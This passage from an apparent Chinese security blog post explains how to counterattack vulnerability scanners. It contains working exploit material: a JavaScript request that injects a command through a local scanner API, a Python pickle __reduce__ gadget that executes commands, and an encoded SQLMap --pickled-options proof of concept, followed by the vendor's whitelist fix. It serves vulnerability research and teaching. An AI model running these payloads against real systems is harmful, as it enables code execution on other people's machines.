+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">xmlhttp</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">xmlhttp</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>);
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>,<span style="color:#e6db74">&#34;http://127.0.0.1:8183/api/addScan&#34;</span>,<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-type&#34;</span>,<span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;RequestValidated&#34;</span>,<span style="color:#e6db74">&#34;true&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">exp</span>);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>本机 Win 10 测试，日志中可以发现命令确实被执行了，但是不知道什么原因没有看到想要的效果 🙁</p>
+<h2 id="sqlmap-反序列化代码执行">SQLMap 反序列化代码执行</h2>
+<p>序列化/反序列化使用不当很容易出现问题，这在各种语言中都有体现（PHP/Java/Python&hellip;）,而且导致的漏洞通常也会很严重，比如：代码执行。以 Python 为例，序列化/反序列化需要用到 pickle 模块，代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>(object):
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">halo</span>(self):
+</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#34;halo world&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>a_pickled <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(A())
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(a_pickled)
+</span></span><span style="display:flex;"><span>print a_pickled
+</span></span><span style="display:flex;"><span>print a, a<span style="color:#f92672">.</span>halo
+</span></span><span style="display:flex;"><span>a<span style="color:#f92672">.</span>halo()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Chu@DESKTOP-PBKB22I /cygdrive/c/Users/Chu/Desktop</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ python test.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ccopy_reg</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># _reconstructor</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (c__main__</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># A</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># c__builtin__</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># object</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ntp3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Rp4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># .</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># &lt;__main__.A object at 0x0000000002AC7C50&gt; &lt;bound method A.halo of &lt;__main__.A object at 0x0000000002AC7C50&gt;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># halo world</span>
+</span></span></code></pre></div><p>可以看到 <code>halo</code> 函数成功执行。Python 对象有一个 <code>__reduce__</code> 方法可以在反序列化时自动执行，由此可以造成代码执行漏洞：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>(object):
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (subprocess<span style="color:#f92672">.</span>Popen, ((<span style="color:#e6db74">&#34;id&#34;</span>,),))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pickle<span style="color:#f92672">.</span>loads(pickle<span style="color:#f92672">.</span>dumps(A()))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Chu@DESKTOP-PBKB22I /cygdrive/c/Users/Chu/Desktop</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ python test.py</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Chu@DESKTOP-PBKB22I /cygdrive/c/Users/Chu/Desktop</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ uid=197609(Chu) gid=197121(None) 组=197121(None),559(Performance Log Users),545(Users),4(INTERACTIVE),66049(CONSOLE LO GON),11(Authenticated Users),15(This Organization),113(本地帐户),66048(LOCAL),262154(NTLM Authentication),401408(Medium</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mandatory Level)</span>
+</span></span></code></pre></div><p>SQLMap 项目中 /lib/core/convert.py 函数 <code>base64unpickle</code> 定义如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64unpickle</span>(value):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Decodes value from Base64 to plain format and deserializes (with pickle) its content
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &gt;&gt;&gt; base64unpickle(&#39;gAJVBmZvb2JhcnEALg==&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;foobar&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    retVal <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        retVal <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(base64decode(value))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">TypeError</span>:
+</span></span><span style="display:flex;"><span>        retVal <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(base64decode(bytes(value)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> retVal
+</span></span></code></pre></div><p>恶意数据 -&gt; cmdLineParser@/lib/parse/cmdline.py -&gt; _mergeOptions@/lib/core/option.py -&gt; base64unpickle@/lib/core/convert.py -&gt; pickle.loads 导致代码执行，POC 如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python sqlmap.py --pickled-options gAJjc3VicHJvY2VzcwpQb3BlbgpxAFUIY2FsYy5leGVxAYVxAoVxA1JxBC4<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p><img src="" alt="the image is lost"></p>
+<p>漏洞被爆出后 SQLMap 团队以白名单方式进行了修复：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Chu@DESKTOP-PBKB22I /cygdrive/f/Pentest
+</span></span><span style="display:flex;"><span>$ diff sqlmap/lib/core/convert.py sqlmap.bak/lib/core/convert.py
+</span></span><span style="display:flex;"><span>11d10
+</span></span><span style="display:flex;"><span>&lt; import StringIO
+</span></span><span style="display:flex;"><span>13d11
+</span></span><span style="display:flex;"><span>&lt; import types
+</span></span><span style="display:flex;"><span>17d14
+</span></span><span style="display:flex;"><span>&lt; from lib.core.settings import PICKLE_REDUCE_WHITELIST
+</span></span><span style="display:flex;"><span>73,85d69
+</span></span><span style="display:flex;"><span>&lt;     def _<span style="color:#f92672">(</span>self<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>&lt;         <span style="color:#66d9ef">if</span> len<span style="color:#f92672">(</span>self.stack<span style="color:#f92672">)</span> &gt; 1:
+</span></span><span style="display:flex;"><span>&lt;             func <span style="color:#f92672">=</span> self.stack<span style="color:#f92672">[</span>-2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>&lt;             <span style="color:#66d9ef">if</span> func not in PICKLE_REDUCE_WHITELIST:
+</span></span><span style="display:flex;"><span>&lt;                 raise Exception, <span style="color:#e6db74">&#34;abusing reduce() is bad, Mkay!&#34;</span>
+</span></span><span style="display:flex;"><span>&lt;         self.load_reduce<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>&lt;
+</span></span><span style="display:flex;"><span>&lt;     def loads<span style="color:#f92672">(</span>str<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>&lt;         file <span style="color:#f92672">=</span> StringIO.StringIO<span style="color:#f92672">(</span>str<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&lt;         unpickler <span style="color:#f92672">=</span> pickle.Unpickler<span style="color:#f92672">(</span>file<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&lt;         unpickler.dispatch<span style="color:#f92672">[</span>pickle.REDUCE<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> _
+</span></span><span style="display:flex;"><span>&lt;         <span style="color:#66d9ef">return</span> unpickler.load<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>&lt;
+</span></span><span style="display:flex;"><span>87c71
+</span></span><span style="display:flex;"><span>&lt;         retVal <span style="color:#f92672">=</span> loads<span style="color:#f92672">(</span>base64decode<span style="color:#f92672">(</span>value<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>&gt;         retVal <span style="color:#f92672">=</span> pickle.loads<span style="color:#f92672">(</span>base64decode<span style="color:#f92672">(</span>value<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>89c73
+</span></span><span style="display:flex;"><span>&lt;         retVal <span style="color:#f92672">=</span> loads<span style="color:#f92672">(</span>base64decode<span style="color:#f92672">(</span>bytes<span style="color:#f92672">(</span>value<span style="color:#f92672">)))</span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>&gt;         retVal <span style="color:#f92672">=</span> pickle.loads<span style="color:#f92672">(</span>base64decode<span style="color:#f92672">(</span>bytes<span style="color:#f92672">(</span>value<span style="color:#f92672">)))</span>
+</span></span></code></pre></div><h2 id="others">Others</h2>
+<p>扫描器中很多点都会调用浏览器的 API 来实现，比如预登陆，所以使用浏览器的漏洞来攻击扫描器是可以的。可以参考这个洞：<a href="https://www.exploit-db.com/exploits/36516/">Acunetix &lt;= 9.5 - OLE Automation Array Remote Code Execution</a></p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="http://an7isec.blogspot.co.il/2014/04/pown-noobs-acunetix-0day.html">Pwn the n00bs - Acunetix 0day</a></li>
+<li><a href="http://drops.wooyun.org/papers/66">Python Pickle反序列化带来的安全问题</a></li>
+<li><a href="https://www.91ri.org/14712.html">如何优雅的反击扫描你网站的黑客</a></li>
+</ul>
+
+    </section>
+</article>
+</main>
+    </body>
+</html>
